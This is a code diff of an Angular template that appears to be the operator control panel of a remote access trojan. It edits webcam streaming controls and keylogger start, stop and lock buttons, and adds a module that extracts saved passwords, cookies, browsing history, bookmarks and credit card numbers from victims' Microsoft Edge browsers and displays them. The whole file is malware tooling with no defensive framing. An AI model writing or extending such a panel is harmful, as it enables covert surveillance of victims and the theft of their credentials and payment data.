@@ -221,9 +221,52 @@
   <div class="module-header">
     <h3>📷 WEBCAM STREAM</h3>
     <div class="module-actions">
-      <button class="cmd-btn"  [class.loading]="webcamBusy"(click)="sendWebcamStartStream()">▶ START</button>
-      <button class="cmd-btn danger" [class.loading]="webcamBusy"(click)="sendWebcamStopStream()">⏹ STOP & SAVE</button>
-    </div>
+
+  <button
+    class="cmd-btn"
+    [class.loading]="webcamBusy"
+    (click)="sendWebcamStartStream()">
+    ▶ START
+  </button>
+
+  <!-- STOP & SAVE -->
+  <div class="cmd-group">
+  <button
+    class="cmd-btn danger"
+    [disabled]="!isRecording"
+    (click)="sendWebcamStopAndSave()">
+    ⏹ STOP & SAVE
+  </button>
+
+  <input
+    type="number"
+    min="1"
+    placeholder="sec"
+    [(ngModel)]="stopSaveDelay"
+    (keydown.enter)="onStopSaveEnter()"
+    class="cmd-input">
+</div>
+
+  <!-- STOP NO SAVE -->
+  <div class="cmd-group">
+  <button
+    class="cmd-btn danger"
+    [disabled]="!isRecording"
+    (click)="sendWebcamStopNoSave()">
+    ⏹ STOP (NO SAVE)
+  </button>
+
+  <input
+    type="number"
+    min="1"
+    placeholder="sec"
+    [(ngModel)]="stopNoSaveDelay"
+    (keydown.enter)="onStopNoSaveEnter()"
+    class="cmd-input">
+</div>
+
+</div>
+
   </div>
 
   <div class="webcam-stage">
@@ -339,7 +382,7 @@
         ▶ START
       </button>
 
-      <button class="cmd-btn red"
+      <button class="cmd-btn danger"
               [disabled]="!keyloggerRunning()"
               [class.active]="!keyloggerRunning()"
               (click)="sendKeyloggerStop()">
@@ -354,7 +397,7 @@
               (click)="sendKeyloggerUnlock()">
         🔓 UNLOCK
       </button>
-       <button class="cmd-btn red"
+       <button class="cmd-btn danger"
               [disabled]="keyloggerLocked()"
               [class.active]="keyloggerLocked()"
               (click)="sendKeyloggerLock()">
@@ -626,6 +669,207 @@
   </div>
 
 </div>
+<!-- ========== EDGE MODULE ========== -->
+<div *ngIf="selectedModule() === 'EDGE'" class="section-card edge-module">
+
+  <div class="edge-header">
+    <h3>🌐 Microsoft Edge Data</h3>
+  </div>
+
+  <!-- EDGE ACTIONS -->
+  <div class="edge-actions">
+
+    <button class="edge-btn" (click)="sendEdgePasswords()">
+      🔐 Passwords
+      <span>Saved login credentials</span>
+    </button>
+
+    <button class="edge-btn" (click)="sendEdgeCookies()">
+      🍪 Cookies
+      <span>Browser cookies</span>
+    </button>
+
+    <button class="edge-btn" (click)="sendEdgeHistory()">
+      🕘 History
+      <span>Visited URLs</span>
+    </button>
+
+    <button class="edge-btn" (click)="sendEdgeBookmarks()">
+      ⭐ Bookmarks
+      <span>Saved bookmarks</span>
+    </button>
+
+    <button class="edge-btn danger" (click)="sendEdgeCreditCards()">
+      💳 Credit Cards
+      <span>Stored payment info</span>
+    </button>
+
+  </div>
+
+  <!-- RESULT -->
+  <div class="edge-result">
+
+    <div *ngIf="edgeLoading()" class="edge-loading">
+      Loading Edge data...
+    </div>
+
+    <!-- PASSWORDS -->
+    <div *ngIf="edgePasswords.length">
+
+      <!-- <div class="edge-section-header">
+        🔐 Passwords
+        <span class="edge-count">{{ edgePasswords.length }}</span>
+      </div> -->
+
+      <div class="edge-scroll">
+        <div *ngFor="let item of edgePasswords" class="edge-item">
+          <div class="edge-icon">🔐</div>
+          <div>
+            <div class="edge-title">
+              {{ item.username }}
+              <span class="edge-badge">AES-GCM</span>
+            </div>
+            <div class="edge-sub">{{ item.url }}</div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+   <!-- COOKIES (CARD STYLE – like Bookmarks) -->
+<div *ngIf="edgeCookies.length">
+
+  <!-- <div class="edge-section-header">
+    🍪 Cookies
+    <span class="edge-count">{{ edgeCookies.length }}</span>
+  </div> -->
+
+  <div class="edge-scroll">
+
+    <!-- DOMAIN CARD -->
+    <div *ngFor="let domain of edgeCookiesGrouped" class="edge-card">
+
+      <!-- CARD HEADER -->
+      <div class="edge-card-header">
+        <span class="edge-card-icon">🍪</span>
+        <span class="edge-card-title">{{ domain.domain }}</span>
+        <span class="edge-card-count">
+          {{ domain.cookies.length }}
+        </span>
+      </div>
+
+      <!-- CARD BODY -->
+      <div class="edge-card-body">
+
+        <!-- COOKIE NAME -->
+        <div *ngFor="let cookie of domain.cookies" class="edge-cookie-block">
+
+          <div class="edge-cookie-name">
+            {{ cookie.name }}
+          </div>
+
+          <!-- PATHS -->
+          <ng-container *ngFor="let item of cookie.paths">
+            <div
+              *ngIf="item.path && item.path !== '/'"
+              class="edge-cookie-path">
+              {{ item.path }}
+            </div>
+          </ng-container>
+
+        </div>
+
+      </div>
+
+    </div>
+
+  </div>
+
+</div>
+
+
+    <!-- HISTORY -->
+    <div *ngIf="edgeHistory.length">
+
+      <!-- <div class="edge-section-header">
+        🕘 History
+        <span class="edge-meta">
+          Last visit: {{ edgeHistory[0]?.url }}
+        </span>
+      </div> -->
+
+      <div class="edge-scroll">
+        <div *ngFor="let item of edgeHistory" class="edge-item">
+          <div class="edge-icon">🕘</div>
+          <div>
+            <div class="edge-title">
+              {{ item.title || 'Visited page' }}
+            </div>
+            <div class="edge-sub">
+              {{ item.url }} · Visits: {{ item.visits }}
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- BOOKMARKS -->
+    <div *ngIf="edgeBookmarks.length">
+
+      <!-- <div class="edge-section-header">
+        ⭐ Bookmarks
+        <span class="edge-count">{{ edgeBookmarks.length }}</span>
+      </div> -->
+
+      <div class="edge-scroll">
+        <div *ngFor="let item of edgeBookmarks" class="edge-item">
+          <div class="edge-icon">⭐</div>
+          <div>
+            <div class="edge-title">{{ item.name }}</div>
+            <div class="edge-sub">
+              {{ item.folder }} · {{ item.url }}
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- CREDIT CARDS -->
+    <div *ngIf="edgeCreditCards.length">
+
+      <!-- <div class="edge-section-header">
+        💳 Credit Cards
+        <span class="edge-count">{{ edgeCreditCards.length }}</span>
+      </div> -->
+
+      <div class="edge-scroll">
+        <div *ngFor="let item of edgeCreditCards" class="edge-item">
+          <div class="edge-icon">💳</div>
+          <div>
+            <div class="edge-title">
+              {{ item.name }}
+              <span class="edge-badge danger">AES-GCM</span>
+            </div>
+            <div class="edge-sub">
+              {{ item.number }} · Exp {{ item.exp_month }}/{{ item.exp_year }}
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div *ngIf="!edgeLoading() && edgeResult().length === 0" class="edge-empty">
+      Select a function to extract Edge data.
+    </div>
+
+  </div>
+
+</div>
+
+
 
 
 
